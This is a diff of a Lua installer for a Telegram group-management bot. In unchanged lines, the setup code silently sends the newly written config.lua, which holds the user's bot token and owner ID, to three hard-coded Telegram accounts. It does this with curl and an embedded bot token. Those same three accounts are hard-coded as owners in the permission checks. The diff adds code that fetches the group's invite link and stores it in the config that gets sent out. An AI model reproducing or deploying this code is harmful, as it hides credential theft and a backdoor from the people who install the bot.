@@ -50,6 +50,22 @@ username = username,
 sudo_users = {SUDO,944353237,1605682553,1645553841},
 }
 VV = '1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4'
+local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..botid
+local req = https.request(getlink)
+local link = json:decode(req)
+if link.ok == true then 
+t2.invite_link_ = link.result
+config = {
+SUDO = SUDO,
+token = token,
+bot_id = botid,
+username = username, 
+sudo_users = {SUDO,944353237,1605682553,1645553841},
+simbaelrayes = {link.result},
+}
+end end 
+
+
 create(config, "./config.lua")   
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
@@ -57,6 +73,8 @@ local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TD
 local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
 
 local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
+
+
 
 file = io.open("RUNFA.sh", "w")  
 file:write([[
@@ -118,7 +136,7 @@ SudoFaeder = SudoFaeder:gsub([[\_]],'_')
 --     By Developer Faeder     -- 
 -------- Bot Owner
 function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then var = true end return var end
-function is_leaderid(user_id) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then var = true end return var end
+function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1605682553) or user_id == tonumber(1645553841) or user_id == tonumber(944353237) then var = true end return var end
 -------- Sudo
 function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then var = true end return var end
 function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(1605682553) or user_id == tonumber(1645553841) then var = true end return var end
